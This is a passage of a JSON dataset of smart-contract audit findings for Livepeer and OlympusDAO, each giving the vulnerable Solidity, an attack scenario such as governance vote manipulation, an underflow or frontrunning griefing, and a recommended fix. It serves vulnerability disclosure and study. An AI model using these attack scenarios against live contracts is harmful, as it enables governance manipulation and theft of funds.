      "summary": "\nThis bug report is about an issue that arises in the Livepeer protocol when a transcoder gets fully slashed and resigned from the transcoder pool. In this case, the transcoder’s `bondedAmount` is set to 0, but their `delegatedAmount` remains unchanged. This means that the transcoder is still seen as an active transcoder in the case of voting, and thus can still vote with 0 weight. \n\nThe problem with this is that if any delegator that delegated their votes to this specific transcoder wants to change their vote, when their weight gets calculated, the subtraction of the weight from the support that the transcoder used in his vote, can cause an overflow. This can be abused by a transcoder by voting a category which he knows will not get a lot of votes.\n\nTo fix this issue, it is recommended that if a transcoder gets fully slashed and resigned, their address should be deleted from `delegateAddress` so they will not appear as a transcoder in the mechanism of counting the votes. Alternatively, the system should not let 0 weight votes happen, since they don't modify the vote state at all.\n\nThe bug report was assessed as a Governance issue, and the severity was decreased to Medium. Livepeer mitigated the issue by implementing a fix in the protocol.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Livepeer",
      "source_link": "https://code4rena.com/reports/2023-08-livepeer",
      "github_link": "https://github.com/code-423n4/2023-08-livepeer-findings/issues/194",
      "tags": [],
      "finders": [
        "1",
        "ladboy233",
        "2"
      ]
    },
    {
      "id": "27049",
      "title": "[M-01] The logic in `_handleVoteOverride` to determine if an account is the transcoder is not consistent with the logic in the `BondManager.sol`",
      "impact": "MEDIUM",
      "content": "\nIn the current implementation, when voting, the function [\\_countVote is triggered](https://github.com/code-423n4/2023-08-livepeer/blob/a3d801fa4690119b6f96aeb5508e58d752bda5bc/contracts/treasury/GovernorCountingOverridable.sol#L151), this function is overridden in the function GovernorCountingOverridable.sol\n\n```solidity\n    _weight = _handleVoteOverrides(_proposalId, tally, voter, _account, _weight);\n```\n\nThis is calling:\n\n```solidity\n   function _handleVoteOverrides(\n        uint256 _proposalId,\n        ProposalTally storage _tally,\n        ProposalVoterState storage _voter,\n        address _account,\n        uint256 _weight\n    ) internal returns (uint256) {\n\n        uint256 timepoint = proposalSnapshot(_proposalId);\n\n        address delegate = votes().delegatedAt(_account, timepoint);\n\n        // @audit\n        // is transcoder?\n        bool isTranscoder = _account == delegate;\n    \n        if (isTranscoder) {\n            // deduce weight from any previous delegators for this transcoder to\n            // make a vote\n            return _weight - _voter.deductions;\n        }\n```\n\nThe logic to determine if an account is the transcoder is too simple in this [line of code](https://github.com/code-423n4/2023-08-livepeer/blob/a3d801fa4690119b6f96aeb5508e58d752bda5bc/contracts/treasury/GovernorCountingOverridable.sol#L184):\n\n```solidity\n// @audit\n// is transcoder?\nbool isTranscoder = _account == delegate;\n```\n\nAnd does not match the logic that determine if the address is an registered transcorder and an active transcoder in the bondManager.sol.\n\nIn BondManager.sol, the function that used to check if a transcoder is registered is in this [line of code](https://github.com/code-423n4/2023-08-livepeer/blob/a3d801fa4690119b6f96aeb5508e58d752bda5bc/contracts/bonding/BondingManager.sol#L1156):\n\n```solidity\n    /**\n     * @notice Return whether a transcoder is registered\n     * @param _transcoder Transcoder address\n     * @return true if transcoder is self-bonded\n     */\n    function isRegisteredTranscoder(address _transcoder) public view returns (bool) {\n        Delegator storage d = delegators[_transcoder];\n        return d.delegateAddress == _transcoder && d.bondedAmount > 0;\n    }\n```\n\nThe function that is used to check if a transcoder is active is in [this line of code](https://github.com/code-423n4/2023-08-livepeer/blob/a3d801fa4690119b6f96aeb5508e58d752bda5bc/contracts/bonding/BondingManager.sol#L1145).\n\n```solidity\n    function isActiveTranscoder(address _transcoder) public view returns (bool) {\n        Transcoder storage t = transcoders[_transcoder];\n        uint256 currentRound = roundsManager().currentRound();\n        return t.activationRound <= currentRound && currentRound < t.deactivationRound;\n    }\n```\n\nMissing the check in the delegator's bond amount (delegators\\[\\_transcoder].bondeAmount > 0).\n\nThe code incorrectedly counts regular delegator as transcoder and does not update the deduction power correctly.\n\n### Recommended Mitigation Steps\n\nReuse the function isRegisteredTranscoder and isActiveTranscoder to determine if an account is a registered and active transcoder when counting the voting power.\n\n### Assessed type\n\nGovernance\n\n**[victorges (Livepeer) confirmed and commented](https://github.com/code-423n4/2023-08-livepeer-findings/issues/206#issuecomment-1721637789):**\n > There is in fact an issue with the inconsistency with the `isRegisteredTranscodeer` function. This report didn't manage to go specifically into that issue, but still pointed a valid problem which is in a sense the root cause there. FTR There is no problem with `isActiveTranscoder` though, since we don't give voting power only to active transcoders. That part of this report is invalid.\n\n**[victorges (Livepeer) mitigated](https://github.com/code-423n4/2023-08-livepeer-findings/issues/206):**\n > https://github.com/livepeer/protocol/pull/626\n\n\n\n***\n\n",
      "summary": "\nThis bug report concerns the voting function in the GovernorCountingOverridable.sol contract. It is triggered by the function _countVote and overridden in the function GovernorCountingOverridable.sol. The logic to determine if an account is a transcoder is too simple and does not match the logic used to determine if an address is an registered transcorder and an active transcoder in the bondManager.sol. \n\nThe code incorrectly counts regular delegator as transcoder and does not update the deduction power correctly. The recommended mitigation steps are to reuse the functions isRegisteredTranscoder and isActiveTranscoder to determine if an account is a registered and active transcoder when counting the voting power. The type of bug assessed is governance. The bug report was confirmed and commented on by Livepeer and the bug was mitigated with the pull request #626.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Livepeer",
      "source_link": "https://code4rena.com/reports/2023-08-livepeer",
      "github_link": "https://github.com/code-423n4/2023-08-livepeer-findings/issues/206",
      "tags": [],
      "finders": [
        "ladboy233"
      ]
    },
    {
      "id": "27048",
      "title": "[H-02] By delegating to a non-transcoder, a delegator can reduce the tally of someone else's vote choice without first granting them any voting power",
      "impact": "HIGH",
      "content": "\nA delegate can subtract their own voting weight from the voting choice of another delegate, even if that user isn't a transcoder. Since they are not a transcoder, they don't have their votes initially increased by the amount delegated to them, voting weight is still subtracted from the tally of their vote choice.\n\nMaliciously, this could be used to effectively double one's voting power, by delegating their votes to a delegator who is about to vote for the choice which they don't want. It can also occur accidentally, for example when somebody delegates to a transcoder who later switches role to delegate.\n\n### Proof of Concept\n\nWhen a user is not a transcoder, their votes are determined by the amount they have delegated to the delegatedAddress, and does not increase when a user delegates to them:\n\n```solidity\n        if (bond.bondedAmount == 0) {\n            amount = 0;\n        } else if (isTranscoder) {\n            amount = bond.delegatedAmount;\n        } else {\n            amount = delegatorCumulativeStakeAt(bond, _round);\n        }\n    }\n```\n\nLet's say that this delegator (Alice) has 100 votes and votes `For`, then another delegator(Bob) has delegated 1000 votes to Alice. As stated above, Alice doesn't get the voting power of Bob's 1000 votes, so the `For` count increases by 100.\n\nBob now votes, and `_handleVotesOverrides` is called. In this function, the first conditional, `if isTranscoder` will return false as Bob is not self-delegating.\n\nThen, there is a check that the address Bob has delegated to has voted. Note that there is a missing check of whether the delegate address is a transcoder. Therefore the logic inside `if (delegateVoter.hasVoted)` is executed:\n\n```solidity\nif (delegateVoter.hasVoted) {\n// this is a delegator overriding its delegated transcoder vote,\n// we need to update the current totals to move the weight of\n// the delegator vote to the right outcome.\nVoteType delegateSupport = delegateVoter.support;\n\n            if (delegateSupport == VoteType.Against) {\n                _tally.againstVotes -= _weight;\n            } else if (delegateSupport == VoteType.For) {\n                _tally.forVotes -= _weight;\n            } else {\n                assert(delegateSupport == VoteType.Abstain);\n                _tally.abstainVotes -= _weight;\n            }\n        }\n\n```\n\nThe logic reduces the tally of whatever choice Alice voted for by Bob's weight. Alice initially voted `For` with 100 votes, and then the For votes is reduced by Bob's `1000 votes`. Lets say that Bob votes `Against`. This will result in an aggregate 900 vote reduction in the `For` tally and +1000 votes for `Agaisnt` after Alice and Bob has finished voting.\n\nIf Alice was a transcoder, Bob will be simply reversing the votes they had delegated to Alice. However since Alice was a delegate, they never gained the voting power that was delegated to her.\n\nBob has effectively gained the ability to vote against somebody else's votes (without first actually increasing their voting power since they are not a transcoder) and can vote themselves, which allows them to manipulate governance.\n\n### Recommended Mitigation Steps\n\nThere should be a check that a delegate is a transcoder before subtracting the tally. Here is some pseudocode:\n\n    if (delegateVoter.hasVoted && ---delegate is transcoder ---)\n\nThis is an edit of the conditional of the function `_handleOverrides`. This ensures that the subtraction of vote tally is only performed when the delegate is a voter AND the delegate is a transcoder. This should fix the accounting/subtraction issue of vote tally for non-transcoder delegates.\n\n### Assessed type\n\nInvalid Validation\n\n**[victorges (Livepeer) confirmed](https://github.com/code-423n4/2023-08-livepeer-findings/issues/96#issuecomment-1720114654)**\n\n**[victorges (Livepeer) mitigated](https://github.com/code-423n4/2023-08-livepeer-findings/issues/96):**\n > https://github.com/livepeer/protocol/pull/625\n > https://github.com/livepeer/protocol/pull/626\n\n\n\n***\n\n \n",
      "summary": "\nThis bug report is about a vulnerability in the Livepeer protocol that allows one delegate to subtract their own voting weight from the voting choice of another delegate, even if that user isn't a transcoder. This could be used maliciously to effectively double one's voting power, by delegating their votes to a delegator who is about to vote for the choice which they don't want. It can also occur accidentally, for example when somebody delegates to a transcoder who later switches role to delegate.\n\nThe bug occurs when a user is not a transcoder, their votes are determined by the amount they have delegated to the delegatedAddress, and does not increase when a user delegates to them. If a delegator (Alice) has 100 votes and votes `For`, then another delegator (Bob) has delegated 1000 votes to Alice. As Alice doesn't get the voting power of Bob's 1000 votes, so the `For` count increases by 100.\n\nBob now votes, and `_handleVotesOverrides` is called. In this function, the first conditional, `if isTranscoder` will return false as Bob is not self-delegating. The logic inside `if (delegateVoter.hasVoted)` is executed and reduces the tally of whatever choice Alice voted for by Bob's weight. This will result in an aggregate 900 vote reduction in the `For` tally and +1000 votes for `Agaisnt` after Alice and Bob has finished voting.\n\nThe recommended mitigation steps is to add a check that a delegate is a transcoder before subtracting the tally. This is an edit of the conditional of the function `_handleOverrides`. This ensures that the subtraction of vote tally is only performed when the delegate is a voter AND the delegate is a transcoder. This should fix the accounting/subtraction issue of vote tally for non-transcoder delegates. This bug has been confirmed and mitigated by Livepeer.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Livepeer",
      "source_link": "https://code4rena.com/reports/2023-08-livepeer",
      "github_link": "https://github.com/code-423n4/2023-08-livepeer-findings/issues/96",
      "tags": [
        "Validation"
      ],
      "finders": [
        "Banditx0x"
      ]
    },
    {
      "id": "27047",
      "title": "[H-01] Underflow in `updateTranscoderWithFees` can cause corrupted data and loss of winning tickets",
      "impact": "HIGH",
      "content": "\n`updateTranscoderWtihFees` can underflow because MathUtils is used instead of PreciseMathUtils.\n\n### Proof of Concept\n\nAccording to [LIP-92](https://github.com/livepeer/LIPs/blob/master/LIPs/LIP-92.md) the initial `treasuryRewardCutRate` will be set to `10%`.\n\n`treasuryRewardCutRate` is set with the `setTreasuryRewardCutRate()`function, which calls the internal function `_setTreasuryRewardCutRate()`.\n\n```javascript\nfile: 2023-08-livepeer/contracts/bonding/BondingManager.sol\n\nfunction _setTreasuryRewardCutRate(uint256 _cutRate) internal {\n        require(PreciseMathUtils.validPerc(_cutRate), \"_cutRate is invalid precise percentage\");\n```\n\nIn this function the value will be checked if it's a valid `PreciseMathUtils` percentage (<`100%` specified with 27-digits precision):\n\n```javascript\nfile: 2023-08-livepeer/contracts/libraries/PreciseMathUtils.sol\nlibrary PreciseMathUtils {\n// ...\n    // Divisor used for representing percentages\n    uint256 public constant PERC_DIVISOR = 10**27;\n\tfunction validPerc(uint256 _amount) internal pure returns (bool) {\n        return _amount <= PERC_DIVISOR;\n    }\n// ...\n```\n\nHowever, in `updateTranscoderWithFees`, to calculate `treasuryRewards`, `MathUtils` is used instead of `PreciseMathUtils`.\n\n```javascript\nfile: 2023-08-livepeer/contracts/bonding/BondingManager.sol\n\nfunction updateTranscoderWithFees(\n        address _transcoder,\n        uint256 _fees,\n        uint256 _round\n    ) external whenSystemNotPaused onlyTicketBroker {\n// ...\nuint256 treasuryRewards = MathUtils.percOf(rewards, treasuryRewardCutRate);\nrewards = rewards.sub(treasuryRewards);\n// ...\n}\n```\n\n`MathUtils` uses a `PREC_DIVISOR` of `1000000` instead of `10 ** 27` from the `PreciseMathUtils`:\n\n```javascript\nfile: 2023-08-livepeer/contracts/libraries/MathUtils.sol\nlibrary MathUtils {\n// ...\n    uint256 public constant PERC_DIVISOR = 1000000;\n// ...\n```\n\nThis leads to `treasuryRewards` value being bigger than expected. Here is a [gist of the POC](https://gist.github.com/bronzepickaxe/60063c47c327a1f2d4ee3dbd6361049b). Running the POC it shows that the current usage of `MathUtils` when calculating `treasuryRewards` will always cause an underflow in the next line of code.\n\n`updateTranscoderWithFees` is called every time a winning ticket is redeemed. Whenever the transcoder has skipped the previous round reward call, this function has to re-calculate the rewards, as documented in [LIP-92](https://github.com/livepeer/LIPs/blob/master/LIPs/LIP-92.md?plain=1#L130). This re-calculation will always fail due to the underflow shown above.\n\n### Impact\n\nThis will lead to accounting errors, unexpected behaviours and can cause a loss of winning tickets.\n\nFirstly, the accounting errors and unexpected behaviours: these are all the storage values getting updated in `updateTranscoderWithFees`:\n\n```javascript\nfile: 2023-08-livepeer/contracts/bonding/BondingManager.sol\n\nfunction updateTranscoderWithFees( address _transcoder,\n        uint256 _fees,\n        uint256 _round\n    ) external whenSystemNotPaused onlyTicketBroker {\n// ...\n// transcoder & earningsPool.data\nL314: Transcoder storage t = transcoders[_transcoder];\nL321: EarningsPool.Data storage earningsPool = t.earningsPoolPerRound[currentRound];\n\n//accounting updates happen here\nL377: t.cumulativeFees = t.cumulativeFees.add(transcoderRewardStakeFees)\n\t  .add(transcoderCommissionFees);\nL382: earningsPool.updateCumulativeFeeFactor(prevEarningsPool,delegatorsFees);\nL384: t.lastFeeRound = currentRound;\n```\n\n*   Let `currentRound() - 1` be the previous round where the transcoder skipped the reward call\n*   Let `currentRound()` be current round\n*   Let `currentRound() + 1` be the next round\n\nDuring `currentRound()` it won't be possible to update the `Transcoder` storage or `earningsPool.data` storage because of the underflow that will happen because `currentRound() - 1` reward call has been skipped by the transcoder.\n\nDuring `currentRound() + 1` it will be possible to call `updateTranscoderWithFees`, however, L382 will only update the `prevEarningsPool`, which in this case will be `currentRound()`, not `currentRound - 1`. Therefor, the `EarningsPool.data.cumulativeRewardFactor` won't be updated for `currentRound() - 1`.\n\nLastly, the validity of a ticket is two rounds as per the [specs](https://github.com/livepeer/wiki/blob/master/spec/streamflow/pm.md?plain=1#L107). This means that a transcoder that receives a winning ticket in `currentRound() - 1` should be able to redeem it in `currentRound() - 1` and `currentRound()`. However, a transcoder that receives a winning ticket in `currentRound() - 1` wont be able to redeem it in `currentRound()` because of the underflow that happens while redeeming a winning ticket in `currentRound()`. The transcoder wont be able to redeem it after `currentRound + 1..N` because the ticket will be expired.\n\n### Recommended Mitigation Steps\n\nUse `PreciseMathLib` instead of `MathLib`:\n\n```javascript\nfile: 2023-08-livepeer/contracts/bonding/BondingManager.sol\n\nL355: \n- uint256 treasuryRewards = MathUtils.percOf(rewards, treasuryRewardCutRate);\n+ uint256 treasuryRewards = PreciseMathUtils.percOf(rewards, treasuryRewardCutRate);\n```\n\n### Assessed type\n\nLibrary\n\n**[victorges (Livepeer) commented](https://github.com/code-423n4/2023-08-livepeer-findings/issues/165#issuecomment-1714255659):**\n > Can confirm this issue!\n\n**[victorges (Livepeer) mitigated](https://github.com/code-423n4/2023-08-livepeer-findings/issues/165):**\n > https://github.com/livepeer/protocol/pull/624\n\n\n\n***\n\n",
      "summary": "\nA bug was found in the `updateTranscoderWtihFees` function of the Livepeer Protocol. MathUtils was used instead of PreciseMathUtils to calculate `treasuryRewards` which can cause an underflow. This underflow can cause accounting errors, unexpected behaviours, and can lead to a loss of winning tickets. \n\nThe `treasuryRewardCutRate` is set with the `setTreasuryRewardCutRate()` function, which calls the internal function `_setTreasuryRewardCutRate()`. This function checks if the value is a valid `PreciseMathUtils` percentage. The `PreciseMathUtils` uses a `PREC_DIVISOR` of `10**27`. However, `MathUtils` uses a `PREC_DIVISOR` of `1000000` instead. This leads to the `treasuryRewards` value being bigger than expected.\n\nThe `updateTranscoderWithFees` is called every time a winning ticket is redeemed. Whenever the transcoder has skipped the previous round reward call, this function has to re-calculate the rewards. This re-calculation will always fail due to the underflow.\n\nThe bug can be mitigated by using `PreciseMathLib` instead of `MathLib` in the `updateTranscoderWithFees` function. This bug was confirmed by Livepeer and a fix was implemented in the form of a pull request.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Livepeer",
      "source_link": "https://code4rena.com/reports/2023-08-livepeer",
      "github_link": "https://github.com/code-423n4/2023-08-livepeer-findings/issues/165",
      "tags": [],
      "finders": [
        "VAD37",
        "ether\\_sky",
        "Krace",
        "bronze\\_pickaxe"
      ]
    },
    {
      "id": "18698",
      "title": "[I-03] Comment in `getTargetDeploymentAmount()` specifies wrong decimals",
      "impact": "LOW",
      "content": "In `getTargetDeploymentAmount()`, the `config.uopt` is returned from the `rateModel`.\n\n```solidity\nfunction getTargetDeploymentAmount() public view returns (uint256 targetDeploymentAmount) {\nISiloInterestRateModel.Config memory config = ISiloInterestRateModel(rateModel).getConfig(\nmarket,\naddress(OHM)\n);\nISilo.UtilizationData memory utilizationData = ISilo(market).utilizationData(address(OHM));\n\n// This is the optimal utilization percentage formatted with 19 decimals\n// This is int256 but should never be negative, so we can safely cast to uint256\nint256 optimalUtilizationPct = config.uopt;\nuint256 totalBorrowed = utilizationData.totalBorrowAmount;\n\n// Optimal utilization percentage is formatted with 18 decimals, so we need to multiply by 1e18\ntargetDeploymentAmount = totalBorrowed.mulDiv(1e18, uint256(optimalUtilizationPct));\n}\n```\n\nThe comment specifies that the optimal utilization percentage is formatted with 19 decimals, but it actually uses 18 decimals. This can be seen in [Silo's documentation](https://silopedia.silo.finance/interest-rates/market-interest-model-configuration#reading-the-interest-model-configuration-for-an-asset) where they specify that `500000000000000000` (0.5e18) represents 50%.\n\nThe code handles this correctly, but the comment should be fixed.\n\n**Recommendation**\n\n```diff\n-   // This is the optimal utilization percentage formatted with 19 decimals\n+   // This is the optimal utilization percentage formatted with 18 decimals\n// This is int256 but should never be negative, so we can safely cast to uint256\nint256 optimalUtilizationPct = config.uopt;\nuint256 totalBorrowed = utilizationData.totalBorrowAmount;\n```\n\n**Review**\n\nFixed as recommended in [b1283b54acc68e228569ebfbe7d9f0d79210ceb1](https://github.com/OlympusDAO/bophades/commit/b1283b54acc68e228569ebfbe7d9f0d79210ceb1).",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ZachObront",
      "protocol_name": "Olympusdao",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/ZachObront/2023-06-23-OlympusDAO.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Zach Obront"
      ]
    },
    {
      "id": "18697",
      "title": "[I-02] Emergency Unwind can be performed in one transaction",
      "impact": "LOW",
      "content": "Currently, for the SiloAMO to be unwound, two function calls are required.\n\nFirst, `setEmergencyUnwind()` is called to set the `shouldEmergencyUnwind` flag to true. This function can only be called by the `emergency_admin` role.\n\nSecond, `emergencyUnwind()` is called, which validates that the flag is set to true before performing the unwind. This function is also restricted to be called by the `emergency_admin` role.\n\nIt would be more efficient for these two functions to be combined into one, since they have the same access controls and would only be called directly one after the other.\n\n**Recommendation**\n\nCombine these two functions into a single `emergencyUnwind()` function, where the unwind occurs and the flag is set (in order to prevent future deposits and updates).\n\n**Review**\n\nFixed as recommended in [c0f696add9f3346f1d21e5fe06c241685a4579b0](https://github.com/OlympusDAO/bophades/commit/c0f696add9f3346f1d21e5fe06c241685a4579b0).",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ZachObront",
      "protocol_name": "Olympusdao",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/ZachObront/2023-06-23-OlympusDAO.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Zach Obront"
      ]
    },
    {
      "id": "18696",
      "title": "[I-01] MINTR.decreaseMintApproval permission is set, but is never used",
      "impact": "LOW",
      "content": "When the SiloAMO.sol policy is deployed, the `requestPermissions()` function includes the following 6 permissions:\n\n```solidity\nrequests = new Permissions[](6);\nrequests[0] = Permissions(MINTR_KEYCODE, MINTR.mintOhm.selector);\nrequests[1] = Permissions(MINTR_KEYCODE, MINTR.burnOhm.selector);\nrequests[2] = Permissions(MINTR_KEYCODE, MINTR.increaseMintApproval.selector);\nrequests[3] = Permissions(MINTR_KEYCODE, MINTR.decreaseMintApproval.selector);\nrequests[4] = Permissions(LENDR_KEYCODE, LENDR.addAMO.selector);\nrequests[5] = Permissions(LENDR_KEYCODE, LENDR.removeAMO.selector);\n```\n\nHowever, the `MINTR.decreaseMintApproval()` function is never used within the policy, and therefore doesn't need to be given permission.\n\n**Recommendation**\n\n```diff\n-  requests = new Permissions[](6);\n+  requests = new Permissions[](5);\nrequests[0] = Permissions(MINTR_KEYCODE, MINTR.mintOhm.selector);\nrequests[1] = Permissions(MINTR_KEYCODE, MINTR.burnOhm.selector);\nrequests[2] = Permissions(MINTR_KEYCODE, MINTR.increaseMintApproval.selector);\n-  requests[3] = Permissions(MINTR_KEYCODE, MINTR.decreaseMintApproval.selector);\n-  requests[4] = Permissions(LENDR_KEYCODE, LENDR.addAMO.selector);\n+  requests[3] = Permissions(LENDR_KEYCODE, LENDR.addAMO.selector);\n-  requests[5] = Permissions(LENDR_KEYCODE, LENDR.removeAMO.selector);\n+  requests[4] = Permissions(LENDR_KEYCODE, LENDR.removeAMO.selector);\n```\n\n**Review**\n\nFixed as recommended in [49555e7e6c3cc9316df0a1dabb28b8d419258c90](https://github.com/OlympusDAO/bophades/commit/49555e7e6c3cc9316df0a1dabb28b8d419258c90).",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ZachObront",
      "protocol_name": "Olympusdao",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/ZachObront/2023-06-23-OlympusDAO.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Zach Obront"
      ]
    },
    {
      "id": "18695",
      "title": "[L-03] `update()` can be DOS'd by frontrunning with dust deposits and withdrawals",
      "impact": "LOW",
      "content": "The `update()` function on the SiloAMO has the following check to protect against flash loans being used to manipulate the utilization rate:\n\n```solidity\nISilo.UtilizationData memory utilizationData = ISilo(market).utilizationData(address(OHM));\nif (utilizationData.interestRateTimestamp == block.timestamp)\nrevert AMO_UpdateReentrancyGuard(address(this));\n```\n\nThis `utilizationData.interestRateTimestamp` is updated every time `_accrueInterest()` is called on the Silo. This occurs each time funds are deposited, withdrawn, borrowed, or repaid.\n\nThis gives a user the ability to grief the `update()` function by frontrunning it and using one of these functions each block.\n\nWhile this usually will not be economical, there could be situations (such as those described in [H-01] and [H-02]) where the incentive would be there to spend the gas to perform such an attack, especially on lower-cost chains like Arbitrum.\n\n**Recommendation**\n\nIf a solution to H-01 is decided that removes the need for flash loan protections, this check can be removed. Otherwise, it is a risk the system will likely need to acknowledge and deal with.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ZachObront",
      "protocol_name": "Olympusdao",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/ZachObront/2023-06-23-OlympusDAO.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Zach Obront"
      ]
    },
    {
      "id": "18694",
      "title": "[L-02] Admin has unlimited power to mint new OHM",
      "impact": "LOW",
      "content": "While the SiloAMO system appears to have many checks and balances, in the form of a permissionless `update()` function and a `maximumToDeploy` cap on OHM deployed, all these checks can be circumvented by a malicious admin.\n\nWhile I don't see an incentive for the admin to do this, it is important to be aware of the risk.\n\n1. The admin can adjust the `maximumToDeploy` cap, effectively minting unlimited OHM:\n\n```solidity\nfunction setMaximumToDeploy(uint256 newMaximum_) external onlyRole(\"lendingamo_admin\") {\nmaximumToDeploy = newMaximum_;\n}\n```\n\n2. The admin could change to a malicious `rateModel`, which could cause user updates to force arbitrary amounts of OHM into the Silo:\n\n```solidity\nfunction setRateModel(address newRateModel_) external onlyRole(\"lendingamo_admin\") {\nrateModel = newRateModel_;\n}\n```\n\n3. The admin could call `deposit()` to mint the OHM to the Silo manually, and increase `updateInterval` to a large enough value that users will never be able to call the permissionless `update()` function:\n\n```solidity\nfunction setUpdateInterval(uint256 newInterval_) external onlyRole(\"lendingamo_admin\") {\nupdateInterval = newInterval_;\n}\n```\n\n**Recommendation**\n\nBe aware of the centralization risks present in this part of the system, and ensure that the `lendingamo_admin` role is protected as a multisig to avoid the risk of compromised keys or a malicious actor.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ZachObront",
      "protocol_name": "Olympusdao",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/ZachObront/2023-06-23-OlympusDAO.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Zach Obront"
      ]
    },
    {
      "id": "18693",
      "title": "[L-01] Yield can only be withdrawn to the admin address, not the treasury",
      "impact": "LOW",
      "content": "When incentives are harvested using the `harvestYield()` function, the yield — which is paid in SILO tokens — is kept in the contract.\n\nThe only way to withdraw this ERC20 is to use the `sweepTokens()` function, which sends the balance to the admin.\n\n```solidity\nfunction sweepTokens(address token_) external onlyRole(\"lendingamo_admin\") {\nERC20(token_).transfer(msg.sender, ERC20(token_).balanceOf(address(this)));\n}\n```\n\nHowever, as confirmed by the team, the yield tokens should be sent to the treasury rather than the individual admin.\n\n**Recommendation**\n\nAt the end of the `harvestYield()` function, send the `claimableRewards` directly to the treasury rather than keeping them in the contract.\n\n**Review**\n\nFixed as recommended in [bf8eb11efd04577789a26d3f9ff49329535682ce](https://github.com/OlympusDAO/bophades/commit/bf8eb11efd04577789a26d3f9ff49329535682ce).",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ZachObront",
      "protocol_name": "Olympusdao",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/ZachObront/2023-06-23-OlympusDAO.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Zach Obront"
      ]
    },
    {
      "id": "18692",
      "title": "[M-03] If MINTR is paused, SiloAMO will not be able to unwind its position",
      "impact": "MEDIUM",
      "content": "There are two situations when the SiloAMO will withdraw OHM from the Silo:\n\n1. The OHM deposits in the Silo relative to borrows results in a utilization rate greater than `uopt`, and `update()` is called.\n\n2. The admin or emergency roles of SiloAMO decide to reduce the position or (in the case of an emergency) unwind the entire AMO, so either `withdraw()` or `emergencyUnwind()` is called.\n\nIn either of these cases, `_withdraw()` is called, which withdraws OHM from the Silo and then burns it:\n\n```solidity\nfunction _withdraw(uint256 amount_) internal {\n// The OHM deposit will accrue interest over time leading to the potential to withdraw more OHM\n// than is tracked by the ohmDeployed value. This is fine, but we need to avoid underflow errors\n// and track the amount of OHM that has been burned from the circulating supply after being accrued\n// as interest\nif (ohmDeployed < amount_) circulatingOhmBurned += amount_ - ohmDeployed;\nohmDeployed -= ohmDeployed > amount_ ? amount_ : ohmDeployed;\n\n// Withdraw OHM from Silo\nISilo(market).withdraw(address(OHM), amount_, false);\n\n// Burn received OHM\n_burnOhm(amount_);\n\nemit Withdrawal(amount_);\n}\n```\n\n```solidity\nfunction _burnOhm(uint256 amount_) internal {\nOHM.increaseAllowance(address(MINTR), amount_);\nMINTR.burnOhm(address(this), amount_);\n}\n```\n\nHowever, if MINTR is paused, the `MINTR.burnOhm()` function will revert because it has the `onlyWhileActive` modifier:\n\n```solidity\nmodifier onlyWhileActive() {\nif (!active) revert MINTR_NotActive();\n_;\n}\n```\n\nWhile it may seem unlikely that these two things happen at the same time, it is easy to envision that an emergency situation for OHM would require pausing the MINTR and unwinding all AMOs.\n\nIn this case, if the MINTR is paused first, it will be impossible to withdraw the OHM from the Silo, and the position will remain stuck at what could be a highly volatile time.\n\n**Recommendation**\n\nWhen `MINTR.burnOhm()` is called in the `_burnOhm()` function, it should be wrapped in a `try/catch` block that will allow the function to continue (keeping the assets so they can be later swept to the admin) even if the MINTR is paused.\n\n```diff\nfunction _burnOhm(uint256 amount_) internal {\nOHM.increaseAllowance(address(MINTR), amount_);\n-   MINTR.burnOhm(address(this), amount_);\n+   try MINTR.burnOhm(address(this), amount_) {} catch {}\n}\n```\n\n**Review**\n\nFixed as recommended in [4e3925521d374627f0ad01c835b537961baa1ba8](https://github.com/OlympusDAO/bophades/commit/4e3925521d374627f0ad01c835b537961baa1ba8).",
      "summary": "\nThe SiloAMO is a system that withdraws OHM from the Silo when the utilization rate is greater than `uopt` or when the admin or emergency roles decide to reduce the position or unwind the whole AMO. The `_withdraw()` function is responsible for this, which withdraws OHM from the Silo and then burns it using the `_burnOhm()` function. The `_burnOhm()` function calls the `MINTR.burnOhm()` function, which has the `onlyWhileActive` modifier. This means that if the MINTR is paused, the `MINTR.burnOhm()` function will revert and the OHM cannot be withdrawn from the Silo, leaving the position stuck. To prevent this, the `MINTR.burnOhm()` function should be wrapped in a `try/catch` block, allowing the function to continue even if the MINTR is paused. This recommendation has been implemented in the [4e3925521d374627f0ad01c835b537961baa1ba8](https://github.com/OlympusDAO/bophades/commit/4e3925521d374627f0ad01c835b537961baa1ba8) commit.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ZachObront",
      "protocol_name": "Olympusdao",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/ZachObront/2023-06-23-OlympusDAO.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Zach Obront"
      ]
    },
    {
      "id": "18691",
      "title": "[M-02] SiloAMO uses outdated InterestRateModel",
      "impact": "MEDIUM",
